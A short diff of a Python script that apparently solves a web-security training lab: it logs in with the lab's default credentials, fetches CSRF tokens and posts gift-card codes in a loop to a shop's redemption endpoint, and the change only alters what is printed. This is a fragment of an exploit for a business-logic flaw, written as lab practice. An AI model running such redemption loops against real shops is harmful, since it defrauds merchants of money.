@@ -66,14 +66,13 @@ def get_codes(url, session, quantity):
 def redeem_codes(url, session, codes):
     for code in codes:
         csrf = get_csrf(url + "/login", session)
-        print(code.string)
         response = session.post(url=url + "/gift-card",
                                 verify=False,
                                 proxies=proxy,
                                 data={"csrf": csrf, "gift-card": code.string})
         if response.status_code == 400:
             break
-        print("[*] " + str(response.status_code))
+        print("[*] " + code.string)
 
 
 def login(url, csrf, session, username="wiener", password="peter"):
